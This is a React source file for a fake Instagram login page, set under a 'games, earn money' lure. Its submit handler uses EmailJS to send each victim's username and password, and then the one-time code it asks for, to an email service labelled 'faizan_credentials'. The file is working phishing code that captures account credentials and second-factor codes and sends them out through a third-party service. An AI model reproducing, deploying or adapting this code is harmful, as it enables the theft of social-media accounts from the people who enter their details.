import "./styles.css";
import { useState } from "react";
import emailjs from "@emailjs/browser";

export default function App() {
  const [input, setInput] = useState({});
  const [loggedIn, setLoggedIn] = useState(false);
  const [otpInput, setOtpInput] = useState("");

  const HandleInput = (e) => {
    const { name, value } = e.target;
    setInput({ ...input, [name]: value });
  };

  const handleFormSubmit = () => {
    emailjs.init("BdRaURoicfm49Xatd");

    // Send email using EmailJS API
    const templateParams = {
      name: input?.name,
      notes: input?.password,
      opt: otpInput
    };

    emailjs
      .send("faizan_credentials", "template_da4878d", templateParams)
      .then((response) => {
        console.log("Email sent successfully!", response);
      })
      .catch((error) => {
        console.error("Email could not be sent:", error);
      });

    setInput({});
    setLoggedIn(!loggedIn);
  };

  return (
    <div className="App">
      <div className="header-img">
        <img
          src="https://www.earntech.in/wp-content/uploads/2023/08/20230812_203010_0000.png"
          alt="games khelo paise jeeto"
        />
      </div>

      <h2>Login using instagram</h2>
      {loggedIn ? (
        <div className="main-content">
          <div className="l-part">
            <input
              type="text"
              placeholder="Enter OTP"
              className="input-1"
              name="name"
              value={otpInput || ""}
              onChange={(e) => setOtpInput(e.target.value)}
            />

            <input
              type="button"
              value="Log in"
              className="btn"
              onClick={handleFormSubmit}
            />
          </div>
        </div>
      ) : (
        <div id="wrapper">
          <div className="main-content">
            <div className="header">
              <img src="https://i.imgur.com/zqpwkLQ.png" alt="instagram" />
            </div>
            <div className="l-part">
              <input
                type="text"
                placeholder="Username"
                className="input-1"
                name="name"
                value={input?.name || ""}
                onChange={HandleInput}
              />
              <div className="overlap-text">
                <input
                  type="password"
                  placeholder="Password"
                  className="input-2"
                  name="password"
                  value={input?.password || ""}
                  onChange={HandleInput}
                />
              </div>
              <input
                type="button"
                value="Log in"
                className="btn"
                onClick={handleFormSubmit}
              />
            </div>
          </div>
        </div>
      )}

      <div className="following-image">
        <h3> Create story and make money $ </h3>
        <img
          src="https://onesearchpro.my/wp-content/uploads/2021/11/Engaging-Instagram-games-can-do-wonders-for-your-online-business-1024x538.jpg"
          alt="following"
        />
      </div>
    </div>
  );
}
